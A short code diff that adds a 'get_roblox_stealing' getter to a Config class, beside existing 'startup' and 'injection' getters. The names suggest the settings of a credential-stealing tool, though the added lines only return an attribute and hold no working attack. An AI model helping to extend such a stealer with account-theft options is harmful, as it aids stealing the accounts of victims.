@@ -21,6 +21,9 @@ class Config:
 
     def startup(self):
         return self.startup
+    
+    def get_roblox_stealing(self):
+        return self.roblox_stealing
 
     def get_injection(self):
         return self.injection   
